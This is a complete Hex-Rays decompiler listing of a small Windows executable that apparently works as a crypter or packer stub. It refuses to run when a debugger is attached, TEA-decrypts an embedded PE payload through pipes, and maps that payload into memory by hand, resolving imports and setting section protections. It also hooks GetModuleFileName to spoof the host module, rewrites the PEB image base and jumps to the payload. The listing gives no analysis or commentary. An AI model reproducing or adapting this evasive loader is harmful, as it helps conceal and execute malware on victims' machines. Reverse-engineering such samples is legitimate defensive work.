/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_3E1000(int);
BOOL __cdecl sub_3E101F(int, LPVOID lpAddress, SIZE_T dwSize);
int __stdcall sub_3E1050(int, int, int);
int __stdcall sub_3E1081(int, int, int);
int (__stdcall *__cdecl sub_3E10B0(HMODULE, unsigned __int8 *, CHAR *))(int a1, int a2, int a3);
BOOL __cdecl sub_3E1122(int);
_DWORD *__cdecl sub_3E1136(int, int);
char __cdecl sub_3E1270(HANDLE hFile, LPVOID lpBuffer, int);
char __cdecl sub_3E12A6(void *, const void *, int);
unsigned int __cdecl sub_3E12DC(HANDLE *, int, unsigned int);
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
BOOL __cdecl sub_3E141E(HANDLE *);
int sub_3E143B();
void __noreturn start(); // weak
struct _TEB *sub_3E15D0();
int __cdecl sub_3E15E0(int, int, int);
int __cdecl sub_3E16AB(int);
int __cdecl sub_3E1776(int, int);
int __cdecl sub_3E1810(int);
_BYTE *__cdecl sub_3E1942(_BYTE *, _BYTE *, int);
int __cdecl sub_3E19AF(unsigned __int8 *, _BYTE *);
int __cdecl sub_3E1A30(unsigned __int8 *, unsigned __int8 *);
char *__cdecl sub_3E1A90(unsigned int, char *, unsigned int);
char *__cdecl sub_3E1AAC(unsigned int, char *, unsigned int, int);
char *__cdecl sub_3E1B6B(signed int, char *, unsigned int);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
_UNKNOWN unk_3E3000; // weak
int dword_3E8803 = 22528; // weak
int (__stdcall *dword_3E8810)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_3E8814)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_3E8818 = 0; // weak
int dword_3E881C = 0; // weak
int dword_40FC7D; // weak
int dword_40FC81; // weak
int dword_40FC85; // weak
int dword_40FC89; // weak


//----- (003E1000) --------------------------------------------------------
int __cdecl sub_3E1000(int a1)
{
  return *(_DWORD *)(a1 + 60) + a1;
}

//----- (003E101F) --------------------------------------------------------
BOOL __cdecl sub_3E101F(int a1, LPVOID lpAddress, SIZE_T dwSize)
{
  DWORD v3; // ecx
  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF

  flOldProtect = v3;
  sub_3E1942(lpAddress, (_BYTE *)a1, dwSize);
  return VirtualProtect(lpAddress, dwSize, 2u, &flOldProtect);
}
// 3E1022: variable 'v3' is possibly undefined

//----- (003E1050) --------------------------------------------------------
int __stdcall sub_3E1050(int a1, int a2, int a3)
{
  if ( !a1 || a1 == dword_3E881C )
    a1 = dword_3E8818;
  return dword_3E8810(a1, a2, a3);
}
// 3E8810: using guessed type int (__stdcall *dword_3E8810)(_DWORD, _DWORD, _DWORD);
// 3E8818: using guessed type int dword_3E8818;
// 3E881C: using guessed type int dword_3E881C;

//----- (003E1081) --------------------------------------------------------
int __stdcall sub_3E1081(int a1, int a2, int a3)
{
  if ( !a1 || a1 == dword_3E881C )
    a1 = dword_3E8818;
  return dword_3E8814(a1, a2, a3);
}
// 3E8814: using guessed type int (__stdcall *dword_3E8814)(_DWORD, _DWORD, _DWORD);
// 3E8818: using guessed type int dword_3E8818;
// 3E881C: using guessed type int dword_3E881C;

//----- (003E10B0) --------------------------------------------------------
int (__stdcall *__cdecl sub_3E10B0(HMODULE a1, unsigned __int8 *a2, CHAR *a3))(int a1, int a2, int a3)
{
  FARPROC ProcAddress; // [esp-4h] [ebp-8h]

  ProcAddress = GetProcAddress(a1, a3);
  if ( sub_3E1A30(a2, "kernel32.dll") )
    return (int (__stdcall *)(int, int, int))ProcAddress;
  if ( !sub_3E19AF((unsigned __int8 *)a3, "GetModuleFileNameA") )
  {
    dword_3E8810 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))ProcAddress;
    return sub_3E1050;
  }
  if ( sub_3E19AF((unsigned __int8 *)a3, "GetModuleFileNameW") )
    return (int (__stdcall *)(int, int, int))ProcAddress;
  dword_3E8814 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))ProcAddress;
  return sub_3E1081;
}
// 3E8810: using guessed type int (__stdcall *dword_3E8810)(_DWORD, _DWORD, _DWORD);
// 3E8814: using guessed type int (__stdcall *dword_3E8814)(_DWORD, _DWORD, _DWORD);

//----- (003E1122) --------------------------------------------------------
BOOL __cdecl sub_3E1122(int a1)
{
  return a1 < 0;
}

//----- (003E1136) --------------------------------------------------------
_DWORD *__cdecl sub_3E1136(int a1, int a2)
{
  _DWORD *result; // eax
  int v3; // ecx
  CHAR *v4; // [esp-1Ch] [ebp-20h]
  HMODULE LibraryA; // [esp-18h] [ebp-1Ch]
  _DWORD *v6; // [esp-14h] [ebp-18h]
  void *ProcAddress; // [esp-10h] [ebp-14h]
  int *v8; // [esp-Ch] [ebp-10h]
  _DWORD *i; // [esp-4h] [ebp-8h]

  dword_3E8818 = (int)GetModuleHandleA(0);
  dword_3E881C = a2;
  for ( i = (_DWORD *)(*(_DWORD *)(a1 + 128) + a2); ; i += 5 )
  {
    result = i;
    if ( !i[3] )
      break;
    v4 = (CHAR *)(i[3] + a2);
    LibraryA = LoadLibraryA(v4);
    if ( i[1] )
      v3 = *i + a2;
    else
      v3 = i[4] + a2;
    v8 = (int *)v3;
    v6 = (_DWORD *)(i[4] + a2);
    while ( *v8 )
    {
      if ( sub_3E1122(*v8) )
        ProcAddress = GetProcAddress(LibraryA, (LPCSTR)(unsigned __int16)*v8);
      else
        ProcAddress = sub_3E10B0(LibraryA, (unsigned __int8 *)v4, (CHAR *)(*v8 + a2 + 2));
      *v6++ = ProcAddress;
      ++v8;
    }
  }
  return result;
}
// 3E8818: using guessed type int dword_3E8818;
// 3E881C: using guessed type int dword_3E881C;

//----- (003E1270) --------------------------------------------------------
char __cdecl sub_3E1270(HANDLE hFile, LPVOID lpBuffer, int a3)
{
  DWORD NumberOfBytesRead; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesRead = 0;
  do
  {
    if ( !ReadFile(hFile, lpBuffer, a3 - NumberOfBytesRead, &NumberOfBytesRead, 0) )
      return 0;
  }
  while ( NumberOfBytesRead != a3 );
  return 1;
}

//----- (003E12A6) --------------------------------------------------------
char __cdecl sub_3E12A6(void *a1, const void *a2, int a3)
{
  DWORD v4; // [esp-4h] [ebp-8h] BYREF

  v4 = 0;
  do
  {
    if ( !WriteFile(a1, a2, a3 - v4, &v4, 0) )
      return 0;
  }
  while ( v4 != a3 );
  return 1;
}

//----- (003E12DC) --------------------------------------------------------
unsigned int __cdecl sub_3E12DC(HANDLE *a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp+0h] [ebp-4h]

  for ( i = 0; ; i += 2 )
  {
    result = i;
    if ( i >= a3 )
      break;
    sub_3E12A6(a1[1], (const void *)(a2 + 4 * i), 8);
    sub_3E1270(*a1, (LPVOID)(a2 + 4 * i), 8);
  }
  return result;
}

//----- (003E1330) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  int i; // [esp+4h] [ebp-1Ch]
  unsigned int v4; // [esp+8h] [ebp-18h]
  int v5; // [esp+Ch] [ebp-14h]
  unsigned int v6; // [esp+10h] [ebp-10h]
  unsigned int Buffer; // [esp+18h] [ebp-8h] BYREF
  unsigned int v8; // [esp+1Ch] [ebp-4h]

  while ( sub_3E1270(*(HANDLE *)lpThreadParameter, &Buffer, 8) )
  {
    v5 = 32;
    v6 = Buffer;
    v4 = v8;
    for ( i = -957401312; v5--; i += 1640531527 )
    {
      v4 -= (dword_40FC89 + (v6 >> 5)) ^ (i + v6) ^ (dword_40FC85 + 16 * v6);
      v6 -= (dword_40FC81 + (v4 >> 5)) ^ (i + v4) ^ (dword_40FC7D + 16 * v4);
    }
    Buffer = v6;
    v8 = v4;
    sub_3E12A6(*((void **)lpThreadParameter + 1), &Buffer, 8);
  }
  return 0;
}
// 40FC7D: using guessed type int dword_40FC7D;
// 40FC81: using guessed type int dword_40FC81;
// 40FC85: using guessed type int dword_40FC85;
// 40FC89: using guessed type int dword_40FC89;

//----- (003E141E) --------------------------------------------------------
BOOL __cdecl sub_3E141E(HANDLE *a1)
{
  CloseHandle(*a1);
  return CloseHandle(a1[1]);
}

//----- (003E143B) --------------------------------------------------------
int sub_3E143B()
{
  int v1; // eax
  char *lpAddress; // [esp+4h] [ebp-2Ch]
  int v3; // [esp+8h] [ebp-28h]
  HANDLE hObject; // [esp+Ch] [ebp-24h]
  HANDLE hReadPipe; // [esp+10h] [ebp-20h] BYREF
  HANDLE v6; // [esp+14h] [ebp-1Ch] BYREF
  struct _PEB *ProcessEnvironmentBlock; // [esp+18h] [ebp-18h]
  HANDLE v8; // [esp+1Ch] [ebp-14h] BYREF
  HANDLE hWritePipe; // [esp+20h] [ebp-10h] BYREF
  _DWORD *v10; // [esp+24h] [ebp-Ch]
  DWORD ThreadId; // [esp+28h] [ebp-8h] BYREF
  struct _TEB *v12; // [esp+2Ch] [ebp-4h]

  v12 = sub_3E15D0();
  ProcessEnvironmentBlock = v12->ProcessEnvironmentBlock;
  if ( ProcessEnvironmentBlock->BeingDebugged )
    return 0;
  dword_40FC7D = 17757;
  dword_40FC81 = 14108;
  dword_40FC85 = 22572;
  dword_40FC89 = 27652;
  if ( !CreatePipe(&hReadPipe, &hWritePipe, 0, 0x10u) )
    return 0;
  if ( !CreatePipe(&v8, &v6, 0, 0x10u) )
    return 0;
  hObject = CreateThread(0, 0, StartAddress, &hReadPipe, 0, &ThreadId);
  sub_3E12DC(&v8, (int)&unk_3E3000, (unsigned int)dword_3E8803 >> 2);
  sub_3E141E(&v8);
  sub_3E141E(&hReadPipe);
  CloseHandle(hObject);
  v10 = (_DWORD *)sub_3E1000((int)&unk_3E3000);
  if ( v10 )
  {
    lpAddress = (char *)v10[13];
    sub_3E101F((int)&unk_3E3000, lpAddress, v10[21]);
    sub_3E15E0((int)v10, (int)&unk_3E3000, (int)lpAddress);
    v1 = sub_3E1000((int)lpAddress);
    v3 = v1;
    if ( v1 )
    {
      sub_3E1136(v1, (int)lpAddress);
      sub_3E1776(v3, (int)lpAddress);
      ProcessEnvironmentBlock->ImageBaseAddress = lpAddress;
      ((void (__cdecl *)(char *))&lpAddress[v10[10]])(&lpAddress[v10[10]]);
    }
  }
  return 0;
}
// 3E8803: using guessed type int dword_3E8803;
// 40FC7D: using guessed type int dword_40FC7D;
// 40FC81: using guessed type int dword_40FC81;
// 40FC85: using guessed type int dword_40FC85;
// 40FC89: using guessed type int dword_40FC89;

//----- (003E15B5) --------------------------------------------------------
void __noreturn start()
{
  int uExitCode; // [esp+0h] [ebp-4h]

  uExitCode = sub_3E143B();
  ExitProcess(uExitCode);
}
// 3E15B5: using guessed type void __noreturn start();

//----- (003E15D0) --------------------------------------------------------
struct _TEB *sub_3E15D0()
{
  return NtCurrentTeb();
}

//----- (003E15E0) --------------------------------------------------------
int __cdecl sub_3E15E0(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // eax
  unsigned __int16 i; // [esp-10h] [ebp-14h]
  unsigned __int16 v6; // [esp-8h] [ebp-Ch]
  int v7; // [esp-4h] [ebp-8h]

  v6 = *(_WORD *)(a1 + 6);
  v7 = a1 + 248;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= (int)v6 )
      break;
    if ( *(_DWORD *)(40 * i + v7 + 8) >= *(_DWORD *)(40 * i + v7 + 16) )
      v4 = *(_DWORD *)(40 * i + v7 + 16);
    else
      v4 = *(_DWORD *)(40 * i + v7 + 8);
    sub_3E1942((_BYTE *)(*(_DWORD *)(40 * i + v7 + 12) + a3), (_BYTE *)(*(_DWORD *)(40 * i + v7 + 20) + a2), v4);
  }
  return result;
}

//----- (003E16AB) --------------------------------------------------------
int __cdecl sub_3E16AB(int a1)
{
  int v2; // [esp+0h] [ebp-4h]

  v2 = 0;
  if ( (a1 & 0x4000000) != 0 )
    v2 = 512;
  if ( (a1 & 0x20000000) != 0 )
  {
    if ( (a1 & 0x40000000) != 0 )
    {
      if ( a1 >= 0 )
        return v2 | 0x20;
      else
        return v2 | 0x40;
    }
    else if ( a1 >= 0 )
    {
      return v2 | 0x10;
    }
    else
    {
      return v2 | 0x80;
    }
  }
  else if ( (a1 & 0x40000000) != 0 )
  {
    if ( a1 >= 0 )
      return v2 | 2;
    else
      return v2 | 4;
  }
  else if ( a1 >= 0 )
  {
    return v2 | 1;
  }
  else
  {
    return v2 | 8;
  }
}

//----- (003E1776) --------------------------------------------------------
int __cdecl sub_3E1776(int a1, int a2)
{
  int result; // eax
  int v3; // eax
  SIZE_T v4; // [esp-1Ch] [ebp-20h]
  void *v5; // [esp-18h] [ebp-1Ch]
  DWORD v6; // [esp-14h] [ebp-18h] BYREF
  unsigned __int16 i; // [esp-10h] [ebp-14h]
  int v8; // [esp-Ch] [ebp-10h]
  unsigned __int16 v9; // [esp-8h] [ebp-Ch]
  int v10; // [esp-4h] [ebp-8h]

  v8 = a1 + 248;
  v9 = *(_WORD *)(a1 + 6);
  v10 = a1 + 248;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= (int)v9 )
      break;
    v5 = (void *)(*(_DWORD *)(40 * i + v10 + 12) + a2);
    v4 = *(_DWORD *)(40 * i + v10 + 8);
    v3 = sub_3E16AB(*(_DWORD *)(40 * i + v10 + 36));
    VirtualProtect(v5, v4, v3, &v6);
  }
  return result;
}

//----- (003E1810) --------------------------------------------------------
int __cdecl sub_3E1810(int a1)
{
  if ( a1 < 65 || a1 > 90 )
    return a1;
  else
    return a1 + 32;
}

//----- (003E1942) --------------------------------------------------------
_BYTE *__cdecl sub_3E1942(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *v5; // [esp+0h] [ebp-4h]

  v5 = a1;
  while ( a3-- )
    *a1++ = *a2++;
  return v5;
}

//----- (003E19AF) --------------------------------------------------------
int __cdecl sub_3E19AF(unsigned __int8 *a1, _BYTE *a2)
{
  int v3; // [esp-4h] [ebp-8h]

  while ( 1 )
  {
    v3 = *a1 - (unsigned __int8)*a2;
    if ( v3 || !*a2 )
      break;
    ++a1;
    ++a2;
  }
  if ( v3 < 0 )
    return -1;
  if ( v3 > 0 )
    return 1;
  return v3;
}

//----- (003E1A30) --------------------------------------------------------
int __cdecl sub_3E1A30(unsigned __int8 *a1, unsigned __int8 *a2)
{
  int v3; // [esp+8h] [ebp-8h]
  int v4; // [esp+Ch] [ebp-4h]

  do
  {
    v4 = sub_3E1810(*a1++);
    v3 = sub_3E1810(*a2++);
  }
  while ( v4 && v4 == v3 );
  return v4 - v3;
}

//----- (003E1A90) --------------------------------------------------------
char *__cdecl sub_3E1A90(unsigned int a1, char *a2, unsigned int a3)
{
  sub_3E1AAC(a1, a2, a3, 0);
  return a2;
}

//----- (003E1AAC) --------------------------------------------------------
char *__cdecl sub_3E1AAC(unsigned int a1, char *a2, unsigned int a3, int a4)
{
  char *result; // eax
  char *v5; // [esp+0h] [ebp-10h]
  char v6; // [esp+7h] [ebp-9h]
  unsigned int v7; // [esp+8h] [ebp-8h]
  char *v8; // [esp+Ch] [ebp-4h]
  char *v9; // [esp+Ch] [ebp-4h]

  v8 = a2;
  if ( a4 )
  {
    *a2 = 45;
    v8 = a2 + 1;
    a1 = -a1;
  }
  v5 = v8;
  do
  {
    v7 = a1 % a3;
    a1 /= a3;
    if ( v7 <= 9 )
      *v8 = v7 + 48;
    else
      *v8 = v7 + 87;
    ++v8;
  }
  while ( a1 );
  *v8 = 0;
  v9 = v8 - 1;
  do
  {
    v6 = *v9;
    *v9 = *v5;
    *v5 = v6;
    --v9;
    result = ++v5;
  }
  while ( v5 < v9 );
  return result;
}

//----- (003E1B6B) --------------------------------------------------------
char *__cdecl sub_3E1B6B(signed int a1, char *a2, unsigned int a3)
{
  if ( a3 == 10 && a1 < 0 )
    sub_3E1AAC(a1, a2, 0xAu, 1);
  else
    sub_3E1AAC(a1, a2, a3, 0);
  return a2;
}

// nfuncs=25 queued=25 decompiled=25 lumina nreq=0 worse=0 better=0
// ALL OK, 25 function(s) have been successfully decompiled
